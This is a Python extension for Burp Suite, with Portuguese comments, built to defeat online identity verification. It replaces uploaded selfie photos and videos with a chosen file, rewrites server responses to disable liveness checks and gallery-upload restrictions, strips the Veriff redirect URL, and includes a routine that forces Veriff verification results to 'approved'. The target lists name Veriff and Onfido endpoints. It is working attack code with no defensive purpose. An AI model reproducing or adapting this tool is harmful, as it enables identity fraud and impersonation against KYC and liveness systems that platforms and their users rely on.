# BurpSuite Extension: Auto-replace selfie video/image + modificar respostas getStepByUuid
#
# INSTALAÇÃO:
# 1. No BurpSuite: Extensions → Add → Extension type: Python
# 2. Selecione este arquivo: burp-selfie-replacer.py
# 3. Ative Proxy → Intercept is on (opcional para respostas; para upload use Intercept)
#
# FUNCIONAMENTO:
# - REQUISIÇÕES: substitui vídeo/imagem de upload pelo arquivo em burp-replacement-path.txt
# - RESPOSTAS: em URLs com getStepByUuid, altera/remove campos de liveness e remove verifyWebviewUrl
#   (evita redirecionamento para magic.veriff.me)

from burp import IBurpExtender, IHttpListener
import os
import base64
import json
class BurpExtender(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Selfie Replacer")
        callbacks.registerHttpListener(self)
        
        # ========================================
        # Lê o caminho do arquivo de substituição do app (burp-replacement-path.txt)
        # Se o app tiver escolhido uma imagem, ela é salva em burp-replacement.jpg/png e o path aqui.
        # ========================================
        self.script_dir = os.path.dirname(os.path.abspath(__file__))
        path_file = os.path.join(self.script_dir, "burp-replacement-path.txt")
        if os.path.exists(path_file):
            try:
                with open(path_file, "r") as f:
                    self.replacement_file = f.read().strip()
            except Exception:
                self.replacement_file = os.path.join(self.script_dir, "burp-replacement.jpg")
        else:
            self.replacement_file = os.path.join(self.script_dir, "burp-replacement.jpg")
        
        # MIME a partir da extensão do arquivo
        ext = os.path.splitext(self.replacement_file)[1].lower()
        mime_map = {
            ".jpg": "image/jpeg", ".jpeg": "image/jpeg", ".png": "image/png",
            ".mp4": "video/mp4", ".webm": "video/webm", ".mov": "video/quicktime",
        }
        self.replacement_mime = mime_map.get(ext, "image/jpeg")
        
        # URLs que devem ter o vídeo substituído (adicione mais se necessário)
        self.target_urls = [
            "/api/upload-selfie",
            "/veriff",
            "/onfido",
            "/upload",
            "/selfie",
            "/video",
            "/photo"
        ]
        # URLs cuja RESPOSTA será modificada (liveness/doc + remover verifyWebviewUrl)
        self.response_modify_urls = ["getStepByUuid"]
        # URLs Veriff (antes usadas para alterar decisões). Agora o app cuida
        # das decisões/liveness; a extensão fica focada em upload.
        self.veriff_decision_patterns = ["veriff", "/verifications/", "/v1/sessions/", "/decision", "/api/v2/verifications"]
        
        # ========================================
        
        if os.path.exists(self.replacement_file):
            file_size = os.path.getsize(self.replacement_file)
            print("=" * 60)
            print("Selfie Replacer carregado! (usa burp-replacement-path.txt do app)")
            print("Arquivo de substituição:", self.replacement_file)
            print("Tamanho:", file_size, "bytes")
            print("MIME type:", self.replacement_mime)
            print("URLs monitoradas:", ", ".join(self.target_urls))
            print("=" * 60)
        else:
            print("AVISO: Arquivo ainda não existe:", self.replacement_file)
            print("Escolha uma imagem no app (Toolbox -> Imagem para o Burp) e recarregue a extensão.")
        print("Respostas modificadas (liveness/verifyWebviewUrl) para URLs:", ", ".join(self.response_modify_urls))


    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if messageIsRequest:
            self._processRequest(messageInfo)
        else:
            self._processResponse(messageInfo)
    
    def _processResponse(self, messageInfo):
        """Modifica apenas respostas getStepByUuid (liveness/verifyWebviewUrl).
        Demais alterações (featureFlags/decisões Veriff) agora são feitas pelo app.
        """
        try:
            raw = messageInfo.getResponse()
            if not raw:
                return
            req = messageInfo.getRequest()
            if not req:
                return
            analyzed_req = self._helpers.analyzeRequest(req)
            url = str(analyzed_req.getUrl())
            analyzed = self._helpers.analyzeResponse(raw)
            body_offset = analyzed.getBodyOffset()
            body_bytes = raw[body_offset:]
            try:
                body_str = self._helpers.bytesToString(body_bytes)
            except Exception:
                return
            new_body_str = None

            # Config do passo (getStepByUuid) — liveness/doc + verifyWebviewUrl
            if any(p in url for p in self.response_modify_urls):
                if "verifyWebviewUrl" in body_str or "do_2024_h2_identity_document_active_liveness" in body_str:
                    new_body_str = self._applyIdentityLivenessOffToBody(body_str)
                    if new_body_str != body_str:
                        self._setResponseBody(messageInfo, analyzed, new_body_str)
                        print("[Selfie Replacer] Resposta alterada (liveness/verifyWebviewUrl):", url[:80])
                        self._log_change("decision", url, {"note": "decisão forçada para approved"})
        except Exception as e:
            print("[Selfie Replacer] Erro ao modificar resposta:", str(e))
    
    def _setResponseBody(self, messageInfo, analyzed, new_body_str):
        headers = analyzed.getHeaders()
        new_headers = []
        for h in headers:
            if h.lower().startswith("content-length:"):
                new_headers.append("Content-Length: %d" % len(self._helpers.stringToBytes(new_body_str)))
            else:
                new_headers.append(h)
        new_response = self._helpers.buildHttpMessage(new_headers, new_body_str)
        messageInfo.setResponse(new_response)
    
    def _applyVeriffApprovalToBody(self, body_str):
        """Força status approved (9001) e verification.status approved em respostas Veriff."""
        try:
            data = json.loads(body_str)
        except Exception:
            return None
        changed = False
        if isinstance(data, dict):
            if data.get("status") and data.get("status") not in ("approved", "success"):
                data["status"] = "approved"
                changed = True
            if "code" in data and data.get("code") != 9001:
                data["code"] = 9001
                changed = True
            if "verification" in data and isinstance(data["verification"], dict):
                v = data["verification"]
                if v.get("status") != "approved":
                    v["status"] = "approved"
                    changed = True
                if v.get("code") != 9001:
                    v["code"] = 9001
                    changed = True
                if v.get("reason") is not None:
                    v["reason"] = None
                    changed = True
                if v.get("reasonCode") is not None:
                    v["reasonCode"] = None
                    changed = True
            elif "verification" not in data and ("status" in data or "code" in data):
                data["verification"] = {"status": "approved", "code": 9001, "reason": None, "reasonCode": None}
                changed = True
        if changed:
            return json.dumps(data)
        return None

    # _applyDriverSessionFlags removido; lógica de driver agora vive no app.
    
    def _applyIdentityLivenessOffToBody(self, body_str):
        """Aplica as mesmas alterações do app: parameterValue false, shouldRestrictGalleryUpload/isLiveVerificationEnabled false, remove verifyWebviewUrl."""
        try:
            data = json.loads(body_str)
        except Exception:
            return self._stripVerifyWebviewUrlRegex(body_str)
        modified = self._applyIdentityLivenessOff(data)
        out = json.dumps(modified)
        return self._stripVerifyWebviewUrlRegex(out)
    
    def _applyIdentityLivenessOff(self, obj):
        if obj is None or not isinstance(obj, (dict, list)):
            return obj
        if isinstance(obj, list):
            return [self._applyIdentityLivenessOff(x) for x in obj]
        out = {}
        for k, v in obj.items():
            if k == "verifyWebviewUrl" or "verifywebviewurl" in k.replace("_", "").replace("-", "").lower():
                continue
            if k == "parameterKey" and v == "do_2024_h2_identity_document_active_liveness":
                out[k] = v
                continue
            if k == "parameterValue" and obj.get("parameterKey") == "do_2024_h2_identity_document_active_liveness":
                out[k] = "false"
                continue
            if k == "shouldRestrictGalleryUpload":
                out[k] = False
                continue
            if k == "isLiveVerificationEnabled":
                out[k] = False
                continue
            out[k] = self._applyIdentityLivenessOff(v)
        return out
    
    def _stripVerifyWebviewUrlRegex(self, txt):
        import re
        if not isinstance(txt, str):
            return txt
        txt = re.sub(r',\s*"verifyWebviewUrl"\s*:\s*"[^"]*"', '', txt)
        txt = re.sub(r'"verifyWebviewUrl"\s*:\s*"[^"]*"\s*,?\s*', '', txt)
        return txt
    
    def _processRequest(self, messageInfo):
        request = messageInfo.getRequest()
        analyzed = self._helpers.analyzeRequest(request)
        url = str(analyzed.getUrl())
        
        # Verifica se a URL está na lista de alvos (upload)
        should_replace = any(pattern in url.lower() for pattern in self.target_urls)
        if not should_replace:
            return
        
        # Re-lê o path do arquivo (app pode ter escolhido outra imagem)
        path_file = os.path.join(self.script_dir, "burp-replacement-path.txt")
        if os.path.exists(path_file):
            try:
                with open(path_file, "r") as f:
                    self.replacement_file = f.read().strip()
                ext = os.path.splitext(self.replacement_file)[1].lower()
                mime_map = {".jpg": "image/jpeg", ".jpeg": "image/jpeg", ".png": "image/png",
                           ".mp4": "video/mp4", ".webm": "video/webm", ".mov": "video/quicktime"}
                self.replacement_mime = mime_map.get(ext, "image/jpeg")
            except Exception:
                pass
        
        body = request[analyzed.getBodyOffset():]
        body_str = self._helpers.bytesToString(body)
        
        # Verifica se é multipart/form-data
        if "multipart/form-data" in body_str.lower():
            if self._replaceMultipart(messageInfo, analyzed, body_str):
                print("[Selfie Replacer] Vídeo substituído (multipart) em:", url)
        # Verifica se é JSON com base64
        elif "application/json" in body_str.lower() or '"video"' in body_str or '"image"' in body_str or '"file"' in body_str:
            if self._replaceJsonBase64(messageInfo, analyzed, body_str):
                print("[Selfie Replacer] Vídeo substituído (JSON) em:", url)
    
    def _replaceMultipart(self, messageInfo, analyzed, body_str):
        try:
            if not os.path.exists(self.replacement_file):
                return False
            
            # Lê o arquivo de substituição
            with open(self.replacement_file, 'rb') as f:
                replacement_data = f.read()
            
            # Encontra o boundary
            boundary = None
            headers = analyzed.getHeaders()
            for header in headers:
                if 'content-type' in header.lower() and 'boundary=' in header.lower():
                    parts = header.split('boundary=')
                    if len(parts) > 1:
                        boundary = parts[1].strip()
                        break
            
            if not boundary:
                # Tenta encontrar no body
                for line in body_str.split('\r\n'):
                    if 'boundary=' in line.lower():
                        boundary = line.split('boundary=')[1].strip().strip('"').strip("'")
                        break
            
            if not boundary:
                print("[Selfie Replacer] Boundary não encontrado")
                return False
            
            # Encontra a parte do vídeo/imagem
            parts = body_str.split('--' + boundary)
            new_parts = []
            replaced = False
            
            for part in parts:
                if not part.strip():
                    new_parts.append(part)
                    continue
                
                # Verifica se esta parte contém vídeo/imagem
                if ('filename=' in part.lower() and 
                    ('video' in part.lower() or 'image' in part.lower() or 'file' in part.lower())):
                    # Encontra onde começa o conteúdo binário
                    header_end = part.find('\r\n\r\n')
                    if header_end > 0:
                        header = part[:header_end + 4]
                        # Reconstrói a parte com o novo conteúdo
                        new_part = header + self._helpers.bytesToString(replacement_data)
                        new_parts.append(new_part)
                        replaced = True
                    else:
                        new_parts.append(part)
                else:
                    new_parts.append(part)
            
            if replaced:
                new_body = ('--' + boundary).join(new_parts)
                
                # Atualiza Content-Length
                new_headers = []
                content_length_set = False
                for header in headers:
                    if 'content-length' in header.lower():
                        new_length = len(self._helpers.stringToBytes(new_body))
                        new_headers.append('Content-Length: ' + str(new_length))
                        content_length_set = True
                    else:
                        new_headers.append(header)
                
                if not content_length_set:
                    new_length = len(self._helpers.stringToBytes(new_body))
                    new_headers.append('Content-Length: ' + str(new_length))
                
                # Reconstrói a requisição
                new_request = self._helpers.buildHttpMessage(new_headers, new_body)
                messageInfo.setRequest(new_request)
                return True
            
            return False
            
        except Exception as e:
            print("[Selfie Replacer] Erro ao substituir multipart:", str(e))
            import traceback
            traceback.print_exc()
            return False
    
    def _replaceJsonBase64(self, messageInfo, analyzed, body_str):
        try:
            if not os.path.exists(self.replacement_file):
                return False
            
            # Tenta fazer parse do JSON
            try:
                data = json.loads(body_str)
            except:
                # Se não for JSON válido, tenta encontrar base64 manualmente
                return False
            
            # Lê o arquivo e converte para base64
            with open(self.replacement_file, 'rb') as f:
                replacement_data = f.read()
            base64_data = base64.b64encode(replacement_data).decode('utf-8')
            
            # Substitui campos de vídeo/imagem
            replaced = False
            for key in ['video', 'image', 'file', 'selfie', 'photo', 'media', 'blob']:
                if key in data:
                    if isinstance(data[key], str):
                        if data[key].startswith('data:'):
                            # Mantém o prefixo data:type;base64,
                            prefix = data[key].split(',')[0] + ','
                            data[key] = prefix + base64_data
                        else:
                            # Assume que é base64 puro ou adiciona prefixo
                            if 'base64' in data[key].lower() or len(data[key]) > 100:
                                data[key] = base64_data
                            else:
                                data[key] = 'data:' + self.replacement_mime + ';base64,' + base64_data
                        replaced = True
            
            if replaced:
                new_body = json.dumps(data)
                headers = analyzed.getHeaders()
                
                # Atualiza Content-Length
                new_headers = []
                content_length_set = False
                for header in headers:
                    if 'content-length' in header.lower():
                        new_length = len(self._helpers.stringToBytes(new_body))
                        new_headers.append('Content-Length: ' + str(new_length))
                        content_length_set = True
                    else:
                        new_headers.append(header)
                
                if not content_length_set:
                    new_length = len(self._helpers.stringToBytes(new_body))
                    new_headers.append('Content-Length: ' + str(new_length))
                
                new_request = self._helpers.buildHttpMessage(new_headers, new_body)
                messageInfo.setRequest(new_request)
                return True
            
            return False
        
        except Exception as e:
            print("[Selfie Replacer] Erro ao substituir JSON:", str(e))
            import traceback
            traceback.print_exc()
            return False
